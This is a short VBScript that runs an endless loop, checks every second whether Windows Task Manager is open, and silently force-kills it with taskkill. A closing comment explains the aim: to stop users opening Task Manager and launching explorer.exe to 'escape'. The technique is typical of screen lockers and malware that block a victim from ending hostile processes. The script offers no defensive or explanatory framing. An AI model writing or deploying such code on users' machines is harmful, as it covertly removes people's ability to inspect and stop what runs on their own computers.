Set objShell = CreateObject("WScript.Shell")

Do
    ' Check if Task Manager is open
    If IsTaskManagerOpen() Then
        ' Close Task Manager
        objShell.Run "taskkill /f /im Taskmgr.exe", 0, True
    End If
    
    ' Wait for 1 second
    WScript.Sleep 1000
Loop

Function IsTaskManagerOpen()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    
    If colProcesses.Count > 0 Then
        IsTaskManagerOpen = True
    Else
        IsTaskManagerOpen = False
    End If
End Function
'users can open task managers and run explorer.exe in create new task to escape